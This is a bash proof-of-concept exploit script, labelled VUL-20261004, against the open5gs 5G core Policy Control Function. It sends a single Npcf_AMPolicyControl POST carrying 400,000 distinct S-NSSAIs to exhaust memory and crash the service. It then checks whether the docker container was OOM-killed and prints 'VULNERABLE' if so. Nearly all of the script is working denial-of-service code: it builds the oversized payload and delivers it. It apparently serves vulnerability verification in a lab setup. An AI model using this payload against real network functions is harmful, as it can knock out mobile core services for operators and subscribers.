#!/usr/bin/env bash
# VUL-20261004 exploit: OOM-kill the open5gs PCF with one Npcf_AMPolicyControl POST carrying
# 400,000 fresh S-NSSAIs while the container is capped at 1 GiB (kernel OOM killer, exit 137).
# usage: bash pcf_am_policy_metric_cardinality_oom.sh [host] [port] [container]
HOST=${1:-172.22.0.27}
PORT=${2:-7777}
CONTAINER=${3:-pcf}
URL="http://$HOST:$PORT/npcf-am-policy-control/v1/policies"
BODY=$(mktemp /tmp/am_policy_400k.XXXXXX.json)

# wait for the PCF SBI to come up (HTTP 400 on a bare GET is the healthy answer)
until [ "$(curl --http2-prior-knowledge -s -o /dev/null -w '%{http_code}' --max-time 5 \
          "http://$HOST:$PORT/npcf-smpolicycontrol/v1/sm-policies")" = "400" ]; do sleep 3; done

# cap the container so the in-request growth ends in a kernel OOM kill
docker update --memory 1g --memory-swap 1g "$CONTAINER" >/dev/null

# build the attack body: 400,000 distinct S-NSSAIs (~11 MB). A file is required because the
# kernel caps a single argv at 128 KiB (~4600 elements).
awk 'BEGIN {
  printf "{\"supi\": \"imsi-460091234567895\", \"notificationUri\": \"http://172.23.0.10:7777/namf-cb/v1/am-policy/x\", \"suppFeat\": \"0\", \"allowedSnssais\": [";
  for (i = 0; i < 400000; i++) printf "%s{\"sst\": 1, \"sd\": \"%06x\"}", (i ? ", " : ""), 400001 + i;
  printf "]}";
}' > "$BODY"

# fire; the PCF dies mid-request while allocating the per-slice metric instances
echo "[*] POST $URL (body $(stat -c %s "$BODY") bytes, 400000 S-NSSAIs)"
curl --http2-prior-knowledge -s -o /dev/null -w '[*] HTTP %{http_code}\n' --max-time 300 \
     -X POST -H 'Content-Type: application/json' -d @"$BODY" "$URL"

# verdict: give the container init a moment to settle, then report
st=""
for i in $(seq 1 15); do
  st=$(docker inspect "$CONTAINER" --format '{{.State.Status}} exit={{.State.ExitCode}} oomkilled={{.State.OOMKilled}}' 2>/dev/null)
  [ "${st%% *}" = "running" ] || break
  sleep 2
done
rm -f "$BODY"
case "$st" in
  *exit=137*) echo "[+] VULNERABLE: PCF OOM-killed -> $st" ;;
  "")         echo "[!] container '$CONTAINER' not found"; exit 2 ;;
  *)          echo "[-] no crash: $st"; exit 1 ;;
esac
